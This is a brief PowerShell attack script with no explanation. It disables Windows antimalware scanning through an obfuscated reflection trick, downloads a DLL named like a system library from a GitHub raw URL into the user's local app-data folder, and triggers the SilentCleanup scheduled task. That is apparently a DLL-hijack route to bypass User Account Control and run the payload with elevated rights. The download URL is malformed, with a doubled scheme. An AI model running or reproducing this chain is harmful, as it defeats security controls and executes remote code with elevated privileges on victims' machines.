$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)


$PayloadDllName = 'api-ms-win-core-kernel32-legacy-l1.dll'

#$Url = "http://127.0.0.1:80/"
$Url = "http://https://raw.githubusercontent.com/veath1/CRDP/main/bin/x64/"


iwr -Uri $Url$PayloadDllName -OutFile $env:LOCALAPPDATA"\"$PayloadDllName



sleep 5
cmd /c schtasks /run /i /tn \Microsoft\Windows\DiskCleanup\SilentCleanup